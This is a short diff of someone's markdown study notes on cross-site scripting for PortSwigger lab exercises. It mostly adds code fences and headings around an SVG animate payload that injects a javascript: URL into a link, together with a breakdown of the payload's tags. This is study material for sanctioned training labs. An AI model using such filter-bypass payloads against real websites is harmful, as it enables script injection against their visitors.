@@ -143,17 +143,19 @@ by @s0md3v from:
 https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#polyglot-xss
 
 
-portswiggers payload (requiers user interaction)
+portswiggers payload (requiers user interaction):
+```
 <svg><a><animate attributeName=href values=javascript:alert(2) /><text x=20 y=20>Click me</text></a>
+```
 
-    # ***1. breakdown:
+**1. breakdown:**
+```
     <svg>   // whitelisted tag 
-        <a>     // whitelisted tag ??? why need 2 tags?
+        <a>     // whitelisted tag (?why need 2 tags?)
             <animate attributeName=href values=javascript:alert(1) />
             <text x=20 y=20>Click me</text>
     </a> -->
-
-==
+```
 
 # ***6. Lab: Reflected XSS with some SVG markup allowed***
 https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed
